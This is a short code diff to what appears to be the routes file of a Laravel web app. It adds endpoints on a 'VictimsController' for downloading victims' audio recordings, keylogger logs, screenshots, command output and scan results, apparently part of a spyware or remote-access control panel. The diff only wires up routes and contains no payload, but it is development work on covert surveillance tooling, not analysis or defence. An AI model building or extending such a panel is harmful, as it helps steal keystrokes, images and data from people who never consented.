@@ -68,6 +68,11 @@ Route::middleware(['auth'])->group(function () {
 
 
     Route::post('/photos/dl', [\App\Http\Controllers\VictimsController::class, 'picture_dl']);
+    Route::post('/record/dl', [\App\Http\Controllers\VictimsController::class, 'record_dl']);
+    Route::post('/keylogger/dl', [\App\Http\Controllers\VictimsController::class, 'keylogger_dl']);
+    Route::post('/screenshot/dl', [\App\Http\Controllers\VictimsController::class, 'screenshot_dl']);
+    Route::post('/cmd/dl', [\App\Http\Controllers\VictimsController::class, 'cmd_dl']);
+    Route::post('/scan/dl', [\App\Http\Controllers\VictimsController::class, 'scan_dl']);
 
 
 });
